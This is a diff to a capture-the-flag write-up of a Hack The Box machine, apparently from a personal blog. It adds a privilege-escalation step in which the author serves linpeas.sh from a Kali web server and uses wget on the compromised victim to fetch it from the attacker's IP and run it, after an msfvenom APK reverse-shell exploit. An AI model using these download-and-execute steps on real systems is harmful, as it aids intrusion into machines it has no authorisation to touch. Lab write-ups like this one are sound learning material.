@@ -21,9 +21,9 @@ output: html_document
 </div>
 
 **Ports/services exploited:** 5000/http
-**Tools:** Metasploit\\
+**Tools:** Metasploit, linpeas\\
 **Techniques:** Enumeration\\
-**Keywords:** msfvenom vulnerability, APK file, reverse shell\\
+**Keywords:** msfvenom vulnerability, APK file, reverse shell, linpeas\\
 
 
 ## 1. Port scanning
@@ -311,10 +311,21 @@ The file is saved at /root/.msf4/local/msf.apk. We make it executable (*sudo chm
 </div>
 
 And it worked! I'm confused and don't understand why it didn't work manually. The exploit is based on the PoC and it should work. Anyway, let's find a way to root!\\
+Let's start by downloading **linpeas.sh** on the server. We start a web server on Kali:
+````
+sudo python -m SimpleHTTPServer
+`````
+And download the file from the victim:
+````
+wget http://10.10.14.22:8000/linpeas.sh
+`````
+We check the file is there and make it executable (*chmod +x*):
 
+<div class="img_container">
+![linpeas]({{https://jsom1.github.io/}}/_images/htb_sk_linpeas.png)
+</div>
 
-
-
+Finally we can run it with *./linpeas.sh*. TODO : analyserr output. Si rien, manual enum
 
 
 
